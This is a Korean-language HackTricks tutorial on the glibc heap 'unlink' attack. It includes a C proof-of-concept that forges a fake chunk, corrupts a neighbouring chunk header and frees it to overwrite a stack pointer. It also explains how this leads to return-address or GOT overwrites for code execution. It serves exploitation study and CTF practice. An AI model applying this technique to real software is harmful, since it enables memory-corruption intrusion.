# Unlink Attack

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요!</strong></summary>

다른 HackTricks 지원 방법:

- **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
- **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 제출하세요.

</details>

## 기본 정보

이 공격이 발견될 당시 대부분 WWW (Write What Where)를 허용했지만, 일부 **검사가 추가**되어 공격의 새 버전이 더 흥미롭고 더 복잡하며 **쓸모없는** 것으로 만들어졌습니다.

### 코드 예시:

<details>

<summary>코드</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* **공격은 tcaches가 사용되는 경우 작동하지 않습니다 (2.26 이후)**

### 목표

* 스택 내의 청크를 가리키는 포인터를 수정하여 스택의 내용을 변경할 수 있도록 함

### 요구 사항

* 일부 메모리(예: 스택)에서 제어를 얻어 일부 속성에 값 할당하여 몇 개의 청크를 생성할 수 있어야 함
* 스택 누출을 통해 가짜 청크의 포인터를 설정할 수 있어야 함

### 공격

* 두 개의 청크가 있음 (chunk1 및 chunk2)
* 공격자는 chunk1의 내용과 chunk2의 헤더를 제어함
* chunk1에서 공격자는 가짜 청크의 구조를 생성함:
* 보호 기능을 우회하기 위해 `size` 필드가 올바르게 설정되어 있어야 함: `corrupted size vs. prev_size while consolidating` 오류를 피하기 위함
* 가짜 청크의 `fd` 및 `bk` 필드가 chunk1 포인터가 저장된 위치를 가리키도록 만들어야 함. 각각 -3 및 -2의 오프셋으로 설정하여 `fake_chunk->fd->bk` 및 `fake_chunk->bk->fd`가 실제 chunk1 주소가 있는 메모리(스택) 위치를 가리키도록 함:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* chunk2의 헤더가 수정되어 이전 청크가 사용되지 않았음을 나타내고 가짜 청크가 포함된 크기로 설정됨
* 두 번째 청크가 해제되면 이 가짜 청크가 연결 해제됨:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* 이전에 `fake_chunk->fd->bk` 및 `fake_chunk->fd->bk`가 동일한 위치(스택에 chunk1이 저장된 위치)를 가리키도록 만들었으므로 유효한 연결된 목록이었음. **두 위치가 동일한 위치를 가리키고 있기 때문에** 마지막 위치만 (`fake_chunk->bk->fd = fake_chunk->fd`) **적용**됨.
* 이로 인해 스택에 있는 chunk1의 포인터가 스택에서 3개의 주소 앞에 저장된 주소(또는 바이트)로 덮어씌워짐
* 따라서 공격자가 다시 chunk1의 내용을 제어할 수 있다면, 스택 내부에 **쓸 수 있게 되어 canary를 건너뛰고 반환 주소를 덮어쓰고 로컬 변수의 값을 및 포인터를 수정할 수 있음**. 다시 스택에 저장된 chunk1 주소를 공격자가 다시 제어할 수 있는 다른 위치로 수정하면 어디든 쓸 수 있음
* 주소가 스택에 저장되어 있기 때문에 이것이 가능했음을 유의해야 함. 위조된 청크의 주소가 저장되는 위치에 따라 위험성과 악용이 달라질 수 있음.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## 참고 자료

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* CTF에서 심지어 unlink 공격을 찾는 것이 이상할 수 있지만, 이 공격이 사용된 몇 가지 writeup을 확인할 수 있음:
* CTF 예시: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* 이 예시에서는 스택 대신 malloc된 주소의 배열이 있음. unlink 공격은 여기에 청크를 할당할 수 있도록 수행되어 malloc된 주소의 배열의 포인터를 제어할 수 있게 함. 그런 다음, 이러한 주소의 청크 내용을 수정할 수 있는 다른 기능이 있어 GOT에 주소를 가리키고 함수 주소를 수정하여 누출 및 RCE를 얻을 수 있음.
